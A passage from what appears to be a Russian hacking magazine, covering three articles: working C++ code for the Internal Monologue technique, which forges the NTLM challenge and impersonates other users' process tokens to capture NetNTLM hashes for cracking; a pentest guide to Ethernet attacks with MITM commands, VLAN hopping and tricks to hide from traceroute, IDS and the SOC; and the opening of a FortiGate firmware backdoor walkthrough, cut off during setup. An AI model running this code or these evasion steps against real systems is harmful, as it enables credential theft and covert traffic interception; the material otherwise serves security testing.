бенностях протокола не требуется. В слу чае NTLMSSP Windows уже авто-
мати чески сге нери рова ла челлендж, который сервер дол жен отослать кли-
енту. Хотя будет пра вильнее сказать даже не челлендж, а пакет, который
содержит всю необ ходимую информацию, чтобы клиентская сторона, исполь-
зуя свой NTLM-хеш, предос тавила ответ.
  Но мы-то хотим исполь зовать собствен ный чел лендж, а не сге нери рован-
ный кем-то! Поэтому челлендж нуж но заменить. К счастью, никаких подписей,
которые могли бы нам помешать, здесь нет. Поэто му просто по рассчитан-
ным офсе там копиру ем наш челлендж.


ReplaceChallenge(serverMessage, challengeBytes);


void ReplaceChallenge(std::vector<uint8_t>& serverMessage, const std:
:vector<uint8_t>& challengeBytes) {
  std::copy(challengeBytes.begin(), challengeBytes.begin() + 8,
serverMessage.begin() + 24);
  std::fill(serverMessage.begin() + 32, serverMessage.begin() + 48, 0
);
}

Де ло за малым. Делаем вид, что кли ент получил этот пакет, вызываем
InitializeSecurityContext(), и клиент генерирует ответ на челлендж.


status = InitializeSecurityContextW(
  &_hCred,
  &_hClientContext,
  (LPWSTR)response.UserName.c_str(),
  ISC_REQ_CONNECTION,
  0,
  SECURITY_NATIVE_DREP,
  &ServerToken,
  0,
  &_hClientContext,
  &ClientToken,
  &ContextAttributes,
  &ClientLifeTime
);



if (status != SEC_E_OK && DisableEss) {
  vfree(ClientSecBuffer2.pvBuffer);
  vfree(ServerSecBuffer2.pvBuffer);
  return InternalMonologueForCurrentUser(challenge, false);
}


std::vector<BYTE> result = GetSecBufferByteArray(&ClientToken);
vfree(ClientSecBuffer2.pvBuffer); // Макрос для освобождения памяти.
Нам эти буферы больше не нужны
vfree(ServerSecBuffer2.pvBuffer);


ParseNTResponse(result, challenge, response);

Об рати внимание, что функция может завершиться неуспешно. В таком слу-
чае следует попробовать сгенерировать ответ, не отключая ESS.
   Итак, остается лишь гра мотно рас парсить ответ. Для этого я написал
отдельную функцию.


void ParseNTResponse(const std::vector<BYTE>& message, LPCWSTR
challenge, InternalMonologueResponse& result) {
  uint16_t lm_resp_len = *reinterpret_cast<const uint16_t*>(&message[
12]);
  uint32_t lm_resp_off = *reinterpret_cast<const uint32_t*>(&message[
16]);
  uint16_t nt_resp_len = *reinterpret_cast<const uint16_t*>(&message[
20]);
  uint32_t nt_resp_off = *reinterpret_cast<const uint32_t*>(&message[
24]);
  uint16_t domain_len = *reinterpret_cast<const uint16_t*>(&message[
28]);
  uint32_t domain_off = *reinterpret_cast<const uint32_t*>(&message[
32]);


  std::vector<BYTE> lm_resp(lm_resp_len);
  std::vector<BYTE> nt_resp(nt_resp_len);
  std::vector<BYTE> domain(domain_len);


  std::copy(message.begin() + lm_resp_off, message.begin() +
lm_resp_off + lm_resp_len, lm_resp.begin());
  std::copy(message.begin() + nt_resp_off, message.begin() +
nt_resp_off + nt_resp_len, nt_resp.begin());
  std::copy(message.begin() + domain_off, message.begin() +
domain_off + domain_len, domain.begin());


  result.Challenge = challenge;
  result.UsernameWithoutDomain = SplitDomain(result.UserName);


  if (nt_resp_len == 24) {
    result.Domain = ConvertHex(byteArrayToString(domain));
    result.Resp1 = byteArrayToString(lm_resp);
    result.Resp2 = byteArrayToString(nt_resp);
  }
  else if (nt_resp_len > 24) {
    result.Domain = ConvertHex(byteArrayToString(domain));
    result.Resp1 = byteArrayToString(nt_resp).substr(0, 32);
    result.Resp2 = byteArrayToString(nt_resp).substr(32);
  }
}

В отве те по кон кретным офсетам можно про читать длину и смещение всей
необходимой для нас информации. Остается лишь под готовить переменные,
которые будут содержать поток байтов, а затем конверти ровать этот поток
в привыч ные для нас символы.


std::wstring byteArrayToString(const std::vector<BYTE>& byteArray) {
  std::wstring result;
  result.reserve(byteArray.size() * 2);
  for (BYTE b : byteArray) {
    wchar_t buf[3];
    wsprintf(buf, L"%02X", b);
    result.append(buf);
  }


  return result;
}

И получаем на руки NetNTLM-хеш, который можно смело брутить! А уж если
получи ли NetNTLM пер вой вер сии, то мож но для увеличе ния ско рости бру та
раз ложить на два DES-клю чика, со вету ет netmux. Либо можешь вос поль-
зоваться онлай новыми сервисами вроде crack.sh или shuck.sh.
   Итак, вре мя демонстра ции! При запуске инструмента без каких-либо аргу-
ментов получаем NetNTLM-хеш пользователя.



              Получение NetNTLM-хеша пользователя

В начале статьи я рассказывал про аргумент -pid. Через него указывается
PID процесса. Исполь зуя магию перевоп лощения, можно получить NetNTLM-
хеш пользователя — владельца этого процесса. Все сводит ся к стандартной
манипуляции с токенами. Получаем токен этого чужого процес са и нацепляем
на себя.


DWORD ApplyProcessToken(DWORD pid) {
  ImpersonateSelf(SecurityDelegation);
  HANDLE procHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION,
FALSE, pid);


  HANDLE hSystemTokenHandle;
  OpenProcessToken(procHandle, TOKEN_DUPLICATE, &hSystemTokenHandle);


  HANDLE newTokenHandle;
  DuplicateTokenEx(hSystemTokenHandle, TOKEN_ALL_ACCESS, NULL,
SecurityDelegation, TokenPrimary, &newTokenHandle);


  ImpersonateLoggedOnUser(newTokenHandle);
  return GetLastError();
}

А затем в той же последова тельности вызыва ем SSPI-функции. Вновь
переходим к демо. Находим PID про цесса, запущенного от лица другого
поль зовате ля, и тащим хеш!





                Получение чужого NetNTLM-хеша


ÂÛÂÎÄÛ

Встроенные в систему Windows механиз мы очень удобны для разработчика,
но некоторые из них могут без проб лем предос тавить выигрыш и атакующе-
му, в чем мы, собственно, сегодня и убедились.
ВЗЛОМ





Атаки на Ethernet в рамках пен теста дают
значительный импакт, одна ко при атаках
на каналь ном уров не есть боль шая веро-
ятность ошибить ся и нарушить нормальную
работу  сети. В этой статье я рас ска жу               Caster                                                                                        Network Security Expert
о нюансах сбо ра информа ции,  техниках             @wearecaster
MITM и Ethernet-пивотин ге.




                        Статья имеет озна комительный характер и пред-
                       назна чена для специалис тов по безопас ности,
                      про водящих тестирова ние в рамках контракта.
                       Автор  и  редак ция  не  несут  ответс твенности
                        за любой вред, причинен ный с применением
                       изложенной информа ции. Распространение вре-
                      донос ных прог рамм, наруше ние работы систем
                      и  нарушение  тайны  переписки  прес ледуются
                      по закону.


В мае 2022 года я выпус кал статью под наз вани ем Ethernet Abyss, в которой
разоб рал атаки на каналь ный уровень. Перед тобой — ее «VIP-ремикс».
На этот раз я расскажу о при емах сбо ра информации об оборудо вании
без шума в эфире, о том, как про водить MITM-атаки безопас но, и об особен-
ностях Ethernet-тун нелей при пивотинге.


ÑÁÎÐ ÈÍÔÎÐÌÀÖÈÈ

L2 — это канальный уровень компь ютерной сети. Тут происходит ком мутация
кадров, сегмента ция сети. Атаки канального уровня могут быть очень опас-
ными, пос кольку атакующий, проник нув в этот сег мент, спо собен нанес ти
боль шой урон. А проникнуть он может либо если его туда пус тили, либо если
он обеспечил себя L2-туннелем.
  Давай погово рим о нюансах сбора информа ции и о том, какие потен-
циальные векторы атак смо жет открыть для себя атакующий при первичном
ана лизе трафика. Дальше я буду активно пользовать ся инс трументом Above,
можешь тоже им обзавестись.


Ïåðâîå ïîäêëþ÷åíèå
Уже пос ле под клю чения к сетевому коммутато ру ата кующий может создать
шум в эфире. Например, авто матичес ки активный NetworkManager с DHCP.
Рекомендую не спешить с активным DHCP, сделай  так, чтобы хотя бы
интерфейс был в состоянии UP.
   Также сто ит заметить, что по DHCP передается имя устрой ства, которое
получи ло адрес  автоматически. Вся  эта информация  будет  хра ниться
на DHCP-сер вере. Это довольно неп риятный расклад для пен тесте ра, однако
передачу хос тнейма по DHCP можно выключить здесь:


sudo nano /etc/NetworkManager/system-connections/Wired\ connection\ 1


[ipv4]
method=auto
dhcp-send-hostname=false





              Пе редача hostname до конфигура ции NM





         Спрятанный hostname системы пос ле конфигурации NM

Таким образом можно спрятать имя системы от DHCP-сервера, просто
не передавать его через настройки NetworkManager.


Discovery-ïðîòîêîëû
Discovery-про токолы нужны для обмена информа цией между устройствами,
однако в большинстве случаев сетевые девайсы нас троены так, что рас сылка
DP происходит абсолютно во все порты ком мутатора, а это сни жает уровень
сетевой безопасности. Атакующий, получив эти кадры, сможет узнать чувс-
тви тельную информацию об оборудовании вро де версии прошивки, модели
устройства, типа адресации.





          Информация о CDP, полученная с помощью Above


Îáíàðóæåíèå 802.1Q-òåãîâ
802.1Q — стан дарт, имеющий отношение к тегиро ванию коммутаци онных
фрей мов. В контек сте коммутато ра при разбиении сети VLAN на сегменты
используются два типа портов:
 • Access — порт в режиме доступа, обычно он настра ивается на сто роне
   конеч ных станций, что бы они имели первичный дос туп к сети;
 • Trunk — при этом режиме про исходит инкапсу ляция Ethernet-кадров.

Когда ата кующий впервые под клю чается к коммутато ру, не исключено, что он
окажет ся именно на Trunk-пор те, где тегиру ются фрей мы. Если дей ствитель-
но так произойдет, то пентестер смо жет ока зать ся во всех VLAN-сегментах,
к которым под клю чен ком мутатор. Вот пример ные сценарии, при которых
такое возможно:
 • Работающий порт по умолчанию находится в кон тексте коммутато ра Cisco.
  Там акти вен про токол DTP, причем все порты работают в режиме Dynamic
   Auto. Если атакующий сгенерирует и отправит в сторону такого порта кадр
  DTP Desirable, это приведет к тому, что порт ата кующего переключится
   в транк.
 • Порт ком мутатора для Voice VLAN настроен небезопасно. Я встречал
   такие случаи, в которых необ ходимо было подключить в раз рыв и VoIP-
   телефон, и компьютер и при этом порт ком мутатора нас траивался
   в режиме  Trunk,  хотя  сто ило бы  гра мот но нас троить VLAN Access
   для компьютера и Voice VLAN для телефо на. Если атакующий най дет такой
   порт, фак тичес ки он уже пробьется во все VLAN-сегменты.

Так что не будет лиш ним поискать на пор те фрей мы 802.1Q, вдруг тебе удас-
тся прыг нуть в осталь ные VLAN-сегменты. Такие мисконфиги встречаются
на коммутато рах, и ты случайно можешь оказаться на транке. Конеч но,
это ред кое явление, но я не мог не упомянуть такой вектор.





                   При мер 802.1Q-тега в кадре

Най ти фрей мы 802.1Q мож но, ана лизи руя тра фик с помощью инстру мента
HIVE. Дос таточно запустить его, указав два аргумен та: интерфейс атакующе-
го и вре мя на ана лиз трафика. После поиска всех тегов инструмент автомати-
чески соз даст необ ходимые вир туаль ные интерфейсы для прыжка в другие
VLAN-сег менты.





                                HIVE

Как видишь, HIVE позволил ата кующему прыгнуть в четыре сегмента VLAN.
Вектор край не редкий, но иногда встречается в корпоратив ных сетях.


LLMNR/NBT-NS Poisoning
Отравле ние LLMNR/NBT-NS — одна из самых распространен ных сетевых
атак. Она  позволяет  получить  учетные  данные  пользовате ля  Windows
в зашифрованном виде, а также откры вает дорогу для про ведения атак NTLM
Relay. Чаще всего для отравления запросов LLMNR/NBT-NS исполь зуют ути-
литу Responder.
  Для такой ата ки нужен именно L2-дос туп в целевой сети, пос коль ку зап-
росы данных протоко лов распространяют ся только в рамках широковеща-
тель ных доменов. Либо атакующий может прос то воткнуть патч-корд в розет-
ку, либо в кон тексте сценария пивотинга у него есть L2-туннель.
  Протокол LLMNR использует мультикастовый адрес 224.0.0.252, в NBNS
при меняется широковещательный тра фик, проходящий по UDP-пор ту 137,
а MDNS работает по адресу 224.0.0.251.
  Инструмент Above поз волит обнаружить в трафике эти протоколы. Если
такое произойдет, то атакующий сможет вос пользоваться век тором атаки
LLMNR/NBT-NS Spoong и перехватит учетные дан ные.





ARP/NBNS-ðàçâåäêà
При запуске ARP-сканирования ты должен иметь в виду, что можешь ока зать
боль шую нагрузку на оборудование, да и система Storm Control подаст сиг-
нал тре воги, если ты превысишь порог допустимого широковещательного
трафика. Когда запускаешь инстру мент, про водя щий ARP-сканиро вание,
обя зательно настрой его скорость, то есть чис ло пакетов в секунду.
   Рас пространенные инструменты для L2-ска нирования — это netdiscover
и nbtscan. Рекомендую вни мательно изу чить все нас тройки и старать ся
не запускать эти прог раммы в режиме «Халк крушить».
  Для netdiscover в качестве первичной раз ведки хорошо выбирать Passive
ARP: инстру мент в автоном ном режиме будет анализировать все ARP-кадры
вокруг себя и выстраивать список хос тов.


sudo netdiscover -i eth0 -p





                 Ре зультат работы пас сивного ARP


Îáíàðóæåíèå äèíàìè÷åñêîé ìàðøðóòèçàöèè
Протоко лы динами чес кой маршрутизации исполь зуются в каждой крупной
корпоратив ной сети и при этом часто оста ются без вни мания с точки зре ния
безопасности.
  DRP-про токолы используют мультикас товую рас сылку, и, чтобы добраться
до пакетов этих про токо лов, атакующему необходим именно L2-доступ (либо
физическое под клю чение  к  сети, либо  L2-туннель пос ле мероприятий
пивотинга). Например, OSPF для мультикастовой рассылки использует
адрес 224.0.0.5, а EIGRP — 224.0.0.10.
   Чаще все го DRP-пакеты ходят в пользователь ских сегментах банально
из-за того, что не заданы настройки пассивно го интерфей са. Когда маршру-
тизатор анонсирует ту или иную сеть, в ту же сеть отправ ляют ся эти пакеты
при ветствия. Если атакующий доберется до них, то сможет подключиться
к домену маршру тизации, узнать о существо вании тех или иных подсетей,
инъекции мар шрутов и про чего.





            Ре зультат обнаружения EIGRP с помощью Above

Собрав  эту информацию, ата кующий пой мет, что в сети использует ся
динами ческая маршрутизация с небезо пасными настройками. Тогда он
может провести атаку на домен. Считай, еще один вектор для атаки изнутри
сети.
   Если этих про токолов нет в трафике, зна чит, в сети нет динамичес кой мар-
шрутизации либо нас троены пассивные интерфей сы.


Îáíàðóæåíèå ñèñòåìû ðåçåðâèðîâàíèÿ
FHRP  обеспечивают  отказоустойчивость  на  уровне  маршрутиза ции.
Основная идея заключается в том, чтобы объеди нить несколько мар шрутиза-
торов в одну логическую группу. Внутри нее будет виртуальный маршру тиза-
тор с виртуальным IP-адресом, который будет назначаться как адрес шлюза
по умолчанию.
  До мен FHRP может подвер гнуться спуфинг-ата ке против Master-роутера,
при оритет которого менее 255. Атакующий в таком случае сможет стать
«челове ком посере дине» и перехватывать тра фик всей сети, которую обслу-
живают FHRP-спикеры.
  В класс FHRP входят следующие протоколы:
 • HSRP (Hot Standby Redundancy Protocol);
 • VRRP (Virtual Router Redundancy Protocol);
 • GLBP (Gateway Load Balancing Protocol).

Как и в случае с DRP-пакетами, для обна ружения FHRP тоже нужен L2-доступ,
и этот протокол тоже использует мультикас товую рассылку:
 • HSRP: 224.0.0.2, для второй версии 224.0.0.102 (UDP/1985);
 • VRRP: 224.0.0.18;
 • GLBP: 224.0.0.102 (UDP/3222).





                Информация о при сутствии HSRP





                Ин формация о присутствии VRRP

Таким образом атакующий получает информа цию о системе резервирования
маршрутизации и может провес ти атаку.


MITM

MITM-атаки внутри инфраструк туры самые мощ ные по импакту. MITM не толь-
ко позволяет перех ватывать учетные записи, но и открывает возможность
для Relay-атак. Но MITM одновременно и самая опасная атака с точки зре ния
воз можности нарушить работу сети. Она не прощает ошибок. Я дам нес коль-
ко советов, которые позволят проводить MITM более аккуратно.


Ìîùíîñòü æåëåçà
По заботь ся о мощности своего железа, оно должно быть готово к тому, что
через него пойдет трафик несколь ких десятков легитим ных хос тов. Это каса-
ется и твоего интерфейса. Если ты собираешь ся спуфить хосты с гигабит ным
интерфейсом, а у тебя коннект 100 Мбайт/с, то скорость сети серь езно пос-
традает и может произойти коллапс. Пользователи быстро заметят, что сеть
ста ла зависать, и позовут сисадминов, а те (если не зря получают зарплату)
поймут, в чем дело. Так пентест перестанет быть сек ретом, и придется крас-
неть перед админами.
   Вот рекомендованные параметры железа:
 • центральный процессор от четырех ядер;
 • опе ративная память от 8 Гбайт;
 • се тевой интерфейс с полным дуплексом, 1 Гбит/с и выше. Хорошо, если
   вый дет под клю чить Ethernet-адаптер через высокоскорос тной интерфейс
   Thunderbolt 3/4.

Однако, скорее все го, ты упрешься в воз можнос ти порта ком мутатора,
к которо му ты подклю чен. Если там линк в 1 Гбит/с, выше этого ты прыг нуть
не смо жешь. Обязатель но сле ди за поведением сети.


Ðàçðåøåíèå ìàðøðóòèçàöèè
Глав ное правило MITM — раз решить маршрутизацию трафика со своей сто-
роны:


sudo sysctl -w net.ipv4.ip_forward= 1

Ина че при ата ке легитимный трафик будет упи раться в твой хост и дальше он
не пройдет, а это DoS, то есть видимый признак атаки. И сно ва пентест
перестанет быть секретом.


Ïîòåíöèàëüíûé Storm Control
Ес ли  на порте  атакующего  есть  Storm  Control  с  контро лем  тра фика
UCAST/MCAST/BCAST, может сработать тре вога оборудования, потому что
порт атакующе го при MITM начнет обра батывать гораздо больше трафика,
чем ожи далось по настроенному THRESHOLD. Имей в виду!


Îáõîä òðàññèðîâêè (TTL Shift)
Сме щение TTL в таб лице mangle поможет спря тать IP-адрес атакующе го
из трассиров ки пакетов. MITM-атаки создают избыточный хоп, и если провес-
ти трассиров ку со стороны легитим ной машины, то IP-адрес атакующего ока-
жется в самой трас сировке. Такой расклад событий SOC точно не оце нит.


sudo iptables -t mangle -A PREROUTING -i eth0 -J TTL --ttl-inc 1


Âîññòàíîâëåíèå ARP-òàáëèöû ïîñëå àòàêè
Твой инструмент обязательно должен генери ровать обратные IS-AT-кадры,
которые вос станавливают состояние ARP-таб лиц хос тов еще до атаки.
Это очень важный момент. Хост или сервис могут и не запросить ARP, они
будут думать, что ты все еще их шлюз. А это DoS. Это очень важный момент,
который сто ит учитывать. Кстати говоря, Ettercap и Arpspoof отлично делают
эту работу, а по окон чании генерируют необ ходимые IS-AT-кадры и восста-
нав лива ют струк туру ARP-таб лиц хос тов.


ICMP Redirect
Во время MITM-атаки твоя машина может генерировать пакеты ICMP
Redirect, что встревожит IDS/IPS, поэто му обязательно выключай на своей
стороне сообщения ICMP Redirect в sysctl.conf.


sudo sysctl -w net.ipv4.conf.all.send_redirects= 0
sudo sysctl -w net.ipv4.conf.eth0.send_redirects= 0


Êîíôèãóðàöèÿ NAT
Одно из глав ных правил MITM — настройка NAT. Обычно ата кующие обходят-
ся одной командой:


sudo iptables -t nat -A POSTROUTING -o eth0 -J MASQUERADE

Без настройки NAT ата кующий не смо жет увидеть вторую часть трафика,
в которой потенциально могут находиться учетные данные. Это происходит
из-за асимметричной мар шру тизации — когда трафик идет одним путем,
но воз вращает ся другим. Благодаря маскарадингу асимметрич ная маршру-
тизация не помешает ата кующему видеть трафик, иду щий в обе стороны.


Ìîäóëü nf_conntrack äëÿ ïðîòîêîëîâ No NAT Friendly
Сквозь тебя может ходить трафик FTP, H.323 и SIP. Это протоколы No NAT
Friendly, и тебе понадобит ся модуль nf_conntrack, чтобы они работали с NAT.
При MITM атакующий должен вклю чить NAT, что бы видеть трафик, иду щий
в обе сто роны.


sudo modprobe nf_conntrack


Âûáîð ìàñîê ïîäñåòåé ïðè ARP Spoofing
При проведении ARP-спуфин га следи за маской подсети, с которой собира-
ешься работать. Если ты возьмешь слишком большую маску, твое железо
может просто не выдержать наг рузки и возникнет DoS.


Îñîáåííîñòü àòàêè ïðè STP (MITM)
При сутствие STP-кадров внутри сети — одно из самых час тых явлений
при анализе трафика. Существуют ата ки на протокол STP, связанные с инъ-
екци ей BPDU-кад ров. Нап ример, что бы про вести MITM, нужно отправить
в ответ BPDU-кадр с наимень шим значением при оритета. Тогда компьютер
ата кующе го получит роль корневого коммутато ра.
  Однако на деле не все так прос то. При эксплуатации STP ты получишь
только частичную MITM, так как не весь трафик будет ходить через кор невой
ком мутатор. Поэтому в таких слу чаях не рассчитывай на большой поток тра-
фика.


ETHERNET-ÒÓÍÍÅËÈ ÏÐÈ ÏÈÂÎÒÈÍÃÅ

Пентестерам иногда нужно проводить атаки канального уровня. Нап ример,
при менить тот же Responder, чтобы перехватить учетные данные. Атакующий
эскалирует свое присутс твие в сети с помощью пивотинга, однако для про-
веде ния атак канального уровня ему необходимы именно L2-туннели. L2-тун-
нелиро вание примени мо при пивотинге, если ата кующе му требуется L2-дос-
туп до целевых хостов.
  Существует два вида VPN-интерфейсов:
 • TAP — виртуальный сетевой драй вер, который эмулирует Ethernet. Работа-
   ет на канальном уровне, оперируя Ethernet-кад рами;
 • TUN — виртуальный сетевой драйвер, который использует ся для постро-
   ения L3-туннелей. Работает на сетевом уров не, опе рируя IP-пакетами.

Ес ли атакующий стре мит ся к атакам канального уровня в целевой сети, ему
нуж но исполь зовать именно TAP-интерфей сы, с которыми он будет строить
L2-туннель. Для этого есть много спо собов, начиная с SSH и OpenVPN
и заканчивая более экзотичес кими вещами, такими как EoIP, GRETAP, L2TPv3,
VXLAN. Пентестер может строить туннели как угодно, но я расскажу о двух
глав ных нюансах.
  Перед тем  как проб росить  L2-тун нель, прописы вай явный маршрут
/32 до целевого хоста, с которым будешь устанавливать туннель. Без этого
маршрута при получении адреса на L2-интерфей се может возникнуть разрыв
туннеля, так как туннель будет перекрывать маршрут до хоста. Команда нес-
ложна — просто пропиши этот маршрут через свой умолчательный шлюз:


sudo ip route add X.X.X.X/32 via X.X.X.X

Ата кующий обес печивает себя L2-тун нелем с помощью специаль ных вир-
туальных интерфейсов. Но чтобы взаимодей ство вать с целевой сетью, необ-
ходимо сначала получить адрес. Обычно атакующий узнает его с помощью
DHCP, однако по DHCP может прилететь другая информа ция о шлюзе, что
спо собно негатив но повлиять на сетевую связность. Поэтому, когда получа-
ешь адрес на L2-интерфей се при пивотин ге, сра зу же второй командой уда-
ляй при летевший умолчательный маршрут:


sudo dhclient -v tap0; sudo route del default

Итак, мы с тобой разобрались в особен ностях Ethernet-пивотинга: какие пра-
вила хорошего тона нуж но применять, чтобы добиться успеха при экс плуата-
ции L2.


ÒÀÁËÈÖÀ ÂÅÊÒÎÐÎÂ

Я сде лал небольшую матрицу самых эффективных атак канального уровня,
от которых есть ощутимый импакт.





Атак канального уровня, конечно же, гораздо боль ше, но я выб рал самые тол-
ковые и эффектив ные век торы, от которых будет польза. Никаких DoS и про-
чих сом нительных вещей.


ÂÛÂÎÄÛ

В этой статье я изложил основные момен ты при пен тесте Ethernet. Этой тех-
нике уже несколько десятков лет, но она по-прежнему применяется на пен-
тестах при внутреннем анализе защищенности. Наде юсь, что этой статьей я
смогу подарить несколько новых техник для пен тестеров, а адми нистраторы
сетей повысят осве домленность.
ВЗЛОМ





Как известно, даже инс трументы для обес-
печения сетевой безопасности могут иметь
серь езные уязвимости. В этой статье мы
разберем, как злоумышленник может взло-           Реверс-инженерPURGENTX
мать межсетевой экран FortiGate и уста-      лабораториитехнологийинновационных
новить в его прошив ке бэкдор.                               и кибербезопасностиAP Security


Эта исто рия начинается с того, что однажды я прочитал ресерч на CVE-2022-
42475, в котором происхо дит переполнение  кучи. Уязвимость при водит
к выполнению произвольного кода. Я решил поп робовать реализовать PoC,
но мне помеша ло отсутствие лицензии. Перед тем как реали зовывать этот
PoC, необходимо уста новить бэкдор на FortiGate с использованием уяз-
вимос ти CVE-2019-5587. В статье я расскажу, как сделать этот бэкдор и как
он работа ет.




                        Статья имеет озна комительный характер и пред-
                       назна чена для специалис тов по безопас ности,
                      про водящих тестирова ние в рамках контракта.
                       Автор  и  редак ция  не  несут  ответс твенности
                        за любой вред, причинен ный с применением
                       изложенной информа ции. Распространение вре-
                      донос ных прог рамм, наруше ние работы систем
                      и  нарушение  тайны  переписки  прес ледуются
                      по закону.


FortiGate — межсетевой экран с возможностью маршру тизации нового
поколения. Он включает в себя боль шинс тво тра дици онных сер висов, таких
как про вер ка трафика, антивирус, VPN, системы предотвращения вторжений,
и другие функции обеспечения безопас ности. Для демонстрации уяз вимос ти
и дальнейших иссле дований необ ходимо подготовить стенд с исполь зовани-
ем FortiGate.


ÃÎÒÎÂÈÌ ÑÒÅÍÄ

Для ресер ча была выбрана версия FortiGate VM64 v6.4.5 build1828 (GA).
Стенд разворачиваю на VMware ESXI, а образы маршрутизатора должны
иметь расширения .out, .ovf, .zip.
  После распаковки архива мы получим следующие файлы.





В дальнейшем для реверса и исследования бинарей нам понадобится диск
виртуальной машины fortios.vmdk.
  В VMware ESXI нужно импорти ровать существу ющую виртуаль ную машину,
поэтому сле дует выб рать режим Create/Register VM, а затем — Deploy a
virtual machine from an OVF or OVA file.





Те перь надо указать следующие фай лы для загрузки виртуальной машины:
 • datadrive.vmdk — сис темный жес ткий диск FortiGate;
 • FortiGate-VM64.ovf — вир туальная машина;
 • fortios.vmdk — фай ловая сис тема и сама начинка FortiGate.

Имя у вир туалки может быть произволь ным, я наз вал ее просто FortiGate.





Пе рейдем к нас трой кам сети. Все сетевые адап теры, кроме первого, вык-
лючим,  потому  что будем  работать  только  с  одним.  Также изме ним
интерфейс с [pt]Network на VM Network. Это нужно, чтобы виртуальная
машина находи лась с нами в одной сети.





Запускаем виртуальную машину, вводим логин — admin, пароль — Enter,
пос ле чего новый пароль необходимо придумать.





По умолчанию FortiGate настроен на использование в качес тве NTP-сервера.
Необходимо отключить NTP-син хронизацию для перехода в пробный режим.




                    NTP — сетевой протокол для синхрониза ции внут-
                       ренних часов компьютера посредством исполь-
                       зования сетей с переменной латентностью.



config system ntp
set ntpsync disable
set type custom
end

Здесь
 • config system ntp — коман да для вхо да в режим конфигурирования
   NTP;
 • set  ntpsync  disable — команда для отключения синхронизации
   с NTP-сервером;
 • set type custom — команда для установки NTP-сервера, который ука-
   зывается вручную.

Те перь настало время настроить маршрутизатор. Настраивать будем удален-
ное под ключение и доступ к веб-интерфейсу фортика.


ÓÄÀËÅÍÍÎÅ ÏÎÄÊËÞ×ÅÍÈÅ

Настра ивать SSH, HTTP, HTTPS, Telnet будем в CLI FortiGate. Для удаленного
под клю чения нужно нас тро ить интерфейс, который мы оста вили включенным:


config system interface
edit port1
set mode static
set role lan
set allowaccess http https telnet ssh ping
set ip 192.168.0.217/24
show
end

Здесь
 • config system interface — команда для входа в режим конфигура-
   ции интерфейса;
 • edit port1 — команда для конфигурации определенного интерфей са;
 • port1 — условное обозначение интерфей са;
 • set mode static — команда для установки ста тического адреса. Чтобы
   настро ить DHCP, нуж но вместо static написать DHCP, и тогда IP-адреса
   будут установлены автомати чески;
 • set  role  lan — коман да для установления роли и интерфейса.
  В FortiGate есть четыре роли:
    • роль lan означает, что интерфейс используется для подключения
      к локальной сети;
    • роль wan означает, что интерфейс используется для подключения
      к интернету;
    • роль dmz означает, что интерфейс используется для подключения
      к сер верам;
    • роль undefined означает, что интерфейс не име ет конкретной роли;
 • set  allowaccess  http  https  telnet  ssh  ping — команда
   для доступа к управлению с использованием https, http, telnet, ssh,
  ping;
 • set ip 192.168.0.217/24 — команда для установ ки IP-адреса и маски
   подсети;
 • show — коман да, которая показывает все настрой ки интерфейса;
 • end — коман да для завершения нас тройки.

Вот так выглядит результат работы коман ды show.





Те перь настраиваем статическую мар шрутиза цию для дос тупа из других
сетей к Web и CLI:


config router static
edit 1
set gateway 192.168.0.255
set device port1
set dst 0.0.0.0 0.0.0.0
set status enable
next
end

Здесь
 • config router static — команда для конфигурации статических мар-
  шрутов;
 • edit 1 — коман да настройки нумера ции с неис пользуемого номера;
 • set gateway 192.168.0.255 — команда для установки адре са шлюза;
 • set device port1 — команда для установки интерфей са;
 • set  dst  0.0.0.0  0.0.0.0 — коман да для установки места наз-
   начения;
 • set status enable — коман да для вклю чения статической маршру-
   тизации;
 • end — коман да для завершения нас тройки.

Ко ман да get router info routing-table all нужна для проверки нас-
тройки статической маршру тиза ции:


S* 0.0.0.0/0 [10/0] via 192.168.0.255, port1
C 192.168.0.0/24 is directly connected, port1

Этот вывод говорит о том, что для всех устройств, находящихся в сети, шлюз
по умолчанию будет 192.168.0.255, а зна чит, настройка ста тической мар-
шрутизации прош ла успешно.
  После этого подключаем ся к веб-интерфей су через браузер по адре су
192.168.0.217. Логин и пароль исполь зуй такой же, как и при подключении
к командной стро ке.





                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ





             ВЗЛАМЫВАЕМ FORTIGATE
           И УСТАНАВЛИВАЕМ БЭКДОР





ÏÎËÓ×ÀÅÌ ÁÝÊÄÎÐ

Пос ле успешной под готовки стенда настало вре мя для бэкдора. Зайдем
в дирек торию с обра зом виртуаль ной машины и виртуальными дисками
FortiGate. В моем случае виртуальный диск называется forti_6_4_5-disk1.
vmdk.





Дальше наступает часть монтирова ния и отравления rootfs.gz. Монтирова-
ние выпол няет ся сле дующим обра зом:


sudo modprobe nbd max_part= 16
sudo mkdir /mnt/fortios
sudo qemu-nbd -r -c /dev/nbd1 ./forti_6_4_5-disk1.vmdk
sudo mount /dev/nbd1p1 /mnt/fortios

Здесь
 • sudo modprobe nbd max_part=16 — команда подготовки для мон-
   тирования статического VDI-образа;
 • sudo mkdir /mnt/fortios — команда для создания дирек тории /mnt/
  fortios;
 • sudo qemu-nbd -r -c /dev/nbd1 ./forti_6_4_5-disk1.vmdk —
   команда для экспорта обра за диска QEMU, с использованием протокола
  NBD:
    • -r — ключ означает экспорт диска только для чтения;
    • -c — ключ означает подключение файла c указанным именем к папке
      /dev устройства NBD;
 • sudo mount /dev/nbd1p1 /mnt/fortios — команда для монтирова-
   ния диска.




                  NBD (Network Block Device) — сетевой протокол,
                      который можно  использовать  для  пересылки
                       блочного  устройства  (обычно жесткого  диска
                      или раз дела) с одного компь юте ра на другой.
                     Нап ример, локальный компьютер может получить
                      доступ к жес тко му диску, подключенному к дру-
                       гому  компь ютеру. В нашем  слу чае  протокол
                       используется для под ключения вир туаль ного жес-
                         ткого диска к компьюте ру. QEMU умеет экспор-
                        тировать вир туаль ный образ диска, используя
                      про токол NBD.


В результате forti_6_4_5-disk1.vmdk успешно мон тируется  к нашему
компьюте ру.




В rootfs.gz содер жится ОС FortiOS, которую мы будем исследовать. Однако
перед рас паков кой rootfs.gz нужно узнать его контрольную сум му CRC-
32 из файла filechecksum, потому что в версиях FortiGate выше 6.0.5 про-
веряется целостность не только архива, но и файлов внутри него. Если про-
верка filechecksum не проходит, машина просто откажется запус каться.
   Те перь рас паковываем архив с использованием ути лит gzip и cpio:


gzip -d rootfs.gz
sudo cpio -idv < rootfs

Архиватор gzip, думаю, тебе знаком — это утилита сжа тия и восстановления
